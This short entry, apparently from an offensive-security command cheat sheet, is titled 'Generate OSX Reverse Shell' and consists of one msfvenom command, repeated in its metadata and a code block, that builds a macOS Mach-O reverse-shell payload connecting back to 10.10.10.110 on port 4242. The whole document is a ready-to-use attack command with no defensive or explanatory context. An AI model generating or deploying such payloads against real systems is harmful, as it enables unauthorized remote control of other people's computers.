---
id: b963d3e4-6851-41b5-afc8-7456948cd92c
name: Generate OSX Reverse Shell
type: command
executor: bash
data: $ msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f macho
  > shell.macho
output: null
created_at: '2023-04-06T03:56:21.275329+00:00'
updated_at: '2023-04-10T20:25:02.586400+00:00'
---

# Generate OSX Reverse Shell

```bash
$ msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f macho > shell.macho
```


